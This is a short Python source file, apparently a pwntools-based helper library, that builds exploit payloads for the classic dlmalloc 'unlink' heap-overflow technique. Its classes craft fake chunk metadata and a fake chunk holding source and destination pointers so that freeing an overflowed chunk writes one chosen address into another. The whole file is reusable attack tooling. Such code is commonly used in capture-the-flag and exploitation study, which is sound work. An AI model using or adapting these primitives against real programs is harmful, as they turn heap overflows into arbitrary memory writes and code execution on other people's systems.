
from pwn import *

class HeaplibException(Exception):
    pass

class CraftedMetadata(object):
    """
    Represents the 2 DWORDS that overwrite the metadata of a chunk
    that is about to be freed.
    """
    def __init__(self, prev_size=0xfffffff8, size=0xfffffffc):
        self.PREV_SIZE = prev_size
        self.SIZE = size

    def __str__(self):
        return pack(self.PREV_SIZE) + pack(self.SIZE)

class CraftedBlock(object):
    """
    Represents a crafted chunk that is positioned to be previous
    to the chunk that has been overflowed into and is subsequently
    freed.
    """
    def __init__(self, source, destination, fake_prevsize=0xfffffff1, fake_size=0xfffffff1):
        self.source = source
        self.destination = destination
        self.fake_prevsize = fake_prevsize
        self.fake_size = fake_size

    def __str__(self):
        return pack(self.fake_prevsize) + pack(self.fake_size) + pack(self.source) + pack(self.destination) + "A"*8

class HeapFrame(object):
    def __init__(self, allocator, source, destination):
        """
        Given a 'source' and a destination, overwrites
        *source with *destination.
        Note : *(destination + 8) should be a writable
        address.
        """
        self.allocator = "dlmalloc"
        self.source = source
        self.destination = destination

    def get_exploit(self):
        """
        Uses the 'unlink' method to craft 2 values :
        1. CraftedMetadata
            This should overwrite the metadata of the block
            being freed.
        2. CraftedBlock
            This should be places in memory right after the
            crafted memory i.e. as the data of the block
            being freed.
        """
        if self.allocator == "dlmalloc":
            return str(CraftedMetadata()), str(CraftedBlock(self.source-12, self.destination))

        raise HeaplibException("Allocator not supported")

    def __str__(self):
        return ''.join(self.get_exploit())
